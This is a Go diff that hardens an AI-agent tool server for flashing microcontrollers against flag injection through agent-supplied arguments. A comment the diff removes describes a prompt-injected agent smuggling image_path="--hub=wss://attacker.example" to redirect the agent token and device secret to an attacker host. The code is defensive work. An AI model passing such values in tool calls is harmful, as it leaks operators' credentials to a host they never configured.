@@ -147,6 +147,162 @@ func positionalArgs(vals ...string) []string {
 	return append(out, vals...)
 }
 
+// flagValueArg is for agent-supplied values that are passed as the value of a
+// flag (rather than as a positional). pflag normally consumes the next token
+// as the value even when it begins with "-", but refusing that shape keeps the
+// command line unambiguous and matches the path/selector policy.
+func flagValueArg(args map[string]any, key string) (string, error) {
+	v := strArg(args, key)
+	if strings.HasPrefix(v, "-") {
+		return "", fmt.Errorf("%s must not start with '-': %q was refused", key, v)
+	}
+	return v, nil
+}
+
+// selectorArg validates one fleet selector. Selectors are positional, so a
+// leading '-' would be parsed as a flag (--fqbn, --hub, ...) and could change
+// the operation instead of selecting a device.
+func selectorArg(v string) (string, error) {
+	v = strings.TrimSpace(v)
+	if v == "" {
+		return "", nil
+	}
+	if strings.HasPrefix(v, "-") {
+		return "", fmt.Errorf("selector must not start with '-': %q was refused", v)
+	}
+	if strings.ContainsAny(v, "\x00\r\n") {
+		return "", fmt.Errorf("selector contains an unsupported control character")
+	}
+	return v, nil
+}
+
+func compileArgs(args map[string]any) ([]string, error) {
+	dir, err := pathArg(args, "sketch_dir")
+	if err != nil {
+		return nil, err
+	}
+	mainIno, err := flagValueArg(args, "main_ino")
+	if err != nil {
+		return nil, err
+	}
+	fqbn, err := flagValueArg(args, "fqbn")
+	if err != nil {
+		return nil, err
+	}
+	if fqbn == "" {
+		return nil, fmt.Errorf("fqbn is required")
+	}
+
+	// Flags first, then the positional path after "--". Putting "--" in the
+	// middle (as an earlier version did) makes every following flag literal
+	// text, so cobra rejects the call: "accepts at most 1 arg(s), received 3".
+	a := []string{"--fqbn", fqbn}
+	if mainIno != "" {
+		a = append(a, "--main-ino", mainIno)
+	}
+	if boolArg(args, "export_binaries") {
+		a = append(a, "--export-binaries")
+	}
+	if dir != "" {
+		a = append(a, positionalArgs(dir)...)
+	}
+	return a, nil
+}
+
+func uploadArgs(args map[string]any) ([]string, error) {
+	dir, err := pathArg(args, "sketch_dir")
+	if err != nil {
+		return nil, err
+	}
+	bin, err := pathArg(args, "binary")
+	if err != nil {
+		return nil, err
+	}
+	fqbn, err := flagValueArg(args, "fqbn")
+	if err != nil {
+		return nil, err
+	}
+	mcu, err := flagValueArg(args, "mcu")
+	if err != nil {
+		return nil, err
+	}
+	host, err := flagValueArg(args, "host")
+	if err != nil {
+		return nil, err
+	}
+	if dir != "" && bin != "" {
+		return nil, fmt.Errorf("sketch_dir and binary are mutually exclusive")
+	}
+
+	a := make([]string, 0, 12)
+	if fqbn != "" {
+		a = append(a, "--fqbn", fqbn)
+	}
+	if bin != "" {
+		a = append(a, "--binary", bin)
+	}
+	if mcu != "" {
+		a = append(a, "--mcu", mcu)
+	}
+	if host != "" {
+		a = append(a, "--host", host)
+	}
+	if p, ok := intArg(args, "port"); ok {
+		if p < 1 || p > 65535 {
+			return nil, fmt.Errorf("port must be between 1 and 65535")
+		}
+		a = append(a, fmt.Sprintf("--port=%d", p))
+	}
+	if bd, ok := intArg(args, "baud"); ok {
+		if bd <= 0 {
+			return nil, fmt.Errorf("baud must be positive")
+		}
+		a = append(a, fmt.Sprintf("--baud=%d", bd))
+	}
+	if dir != "" {
+		a = append(a, positionalArgs(dir)...)
+	}
+	return a, nil
+}
+
+func fleetPushArgs(args map[string]any) ([]string, error) {
+	if !boolArg(args, "confirm") {
+		return nil, fmt.Errorf("confirm must be true to run a fleet push")
+	}
+	image, err := pathArg(args, "image")
+	if err != nil {
+		return nil, err
+	}
+	if image == "" {
+		return nil, fmt.Errorf("image is required")
+	}
+
+	// --yes must stay before the terminator; image and selectors are
+	// positional. Each selector starts with '-' would otherwise be parsed as
+	// a flag and could override --yes or the configured hub.
+	a := []string{"push", "--yes", "--", image}
+	if raw, ok := args["selectors"]; ok {
+		sels, ok := raw.([]any)
+		if !ok {
+			return nil, fmt.Errorf("selectors must be an array of strings")
+		}
+		for _, sel := range sels {
+			v, ok := sel.(string)
+			if !ok {
+				return nil, fmt.Errorf("selectors must be an array of strings")
+			}
+			v, err := selectorArg(v)
+			if err != nil {
+				return nil, err
+			}
+			if v != "" {
+				a = append(a, v)
+			}
+		}
+	}
+	return a, nil
+}
+
 func boolArg(args map[string]any, key string) bool {
 	v, _ := args[key].(bool)
 	return v
@@ -288,21 +444,9 @@ func (s *mcpServer) defaultTools() []*mcpTool {
 				"required": []string{"fqbn"},
 			},
 			handler: func(ctx context.Context, args map[string]any) (string, error) {
-				dir, err := pathArg(args, "sketch_dir")
+				a, err := compileArgs(args)
 				if err != nil {
 					return "", err
-				}
-				var a []string
-				if dir != "" {
-					// sketch_dir is positional, so it must follow "--".
-					a = positionalArgs(dir)
-				}
-				a = append(a, "--fqbn", strArg(args, "fqbn"))
-				if m := strArg(args, "main_ino"); m != "" {
-					a = append(a, "--main-ino", m)
-				}
-				if boolArg(args, "export_binaries") {
-					a = append(a, "--export-binaries")
 				}
 				return runCLI(ctx, newCompileCmd(), a)
 			},
@@ -326,34 +470,9 @@ func (s *mcpServer) defaultTools() []*mcpTool {
 			},
 			destructive: true,
 			handler: func(ctx context.Context, args map[string]any) (string, error) {
-				dir, err := pathArg(args, "sketch_dir")
+				a, err := uploadArgs(args)
 				if err != nil {
 					return "", err
-				}
-				bin, err := pathArg(args, "binary")
-				if err != nil {
-					return "", err
-				}
-				var a []string
-				if dir != "" {
-					// sketch_dir is positional, so it must follow "--".
-					a = positionalArgs(dir)
-				}
-				a = append(a, "--fqbn", strArg(args, "fqbn"))
-				if bin != "" {
-					a = append(a, "--binary", bin)
-				}
-				if m := strArg(args, "mcu"); m != "" {
-					a = append(a, "--mcu", m)
-				}
-				if h := strArg(args, "host"); h != "" {
-					a = append(a, "--host", h)
-				}
-				if p, ok := intArg(args, "port"); ok {
-					a = append(a, fmt.Sprintf("--port=%d", p))
-				}
-				if bd, ok := intArg(args, "baud"); ok {
-					a = append(a, fmt.Sprintf("--baud=%d", bd))
 				}
 				return runCLI(ctx, newUploadCmd(), a)
 			},
@@ -391,19 +510,16 @@ func (s *mcpServer) defaultTools() []*mcpTool {
 				if s.hub == "" {
 					return "", fmt.Errorf("no relay hub configured — start the server with --hub wss://your-host")
 				}
-				device, image := strArg(args, "device"), strArg(args, "image_path")
-				if device == "" || image == "" {
-					return "", fmt.Errorf("device and image_path are both required")
+				device, err := flagValueArg(args, "device")
+				if err != nil {
+					return "", err
 				}
-				// image_path is agent-controlled and lands on the command line.
-				// Without this, a prompt-injected agent passes
-				// image_path="--hub=wss://attacker.example" and pflag takes the
-				// LAST --hub, overriding the one this server was started with —
-				// sending the agents token and the device secret to a host the
-				// operator never configured.
 				image, err := pathArg(args, "image_path")
 				if err != nil {
 					return "", err
+				}
+				if device == "" || image == "" {
+					return "", fmt.Errorf("device and image_path are both required")
 				}
 				// Check the credential BEFORE dialling the hub. Without this the
 				// agent only sees "device secret required (pass --device-secret)",
@@ -444,26 +560,9 @@ func (s *mcpServer) defaultTools() []*mcpTool {
 			},
 			destructive: true,
 			handler: func(ctx context.Context, args map[string]any) (string, error) {
-				if !boolArg(args, "confirm") {
-					return "", fmt.Errorf("confirm must be true to run a fleet push")
-				}
-				image, err := pathArg(args, "image")
+				a, err := fleetPushArgs(args)
 				if err != nil {
 					return "", err
-				}
-				if image == "" {
-					return "", fmt.Errorf("image is required")
-				}
-				// --yes skips the interactive confirmation (an agent cannot
-				// type it). It is placed before the positional image and
-				// selectors so pflag parses it as a flag, not a selector.
-				a := []string{"push", "--yes", image}
-				if sels, ok := args["selectors"].([]any); ok {
-					for _, sel := range sels {
-						if v, ok := sel.(string); ok && v != "" {
-							a = append(a, v)
-						}
-					}
 				}
 				return runCLI(ctx, newFleetCommand(), a)
 			},
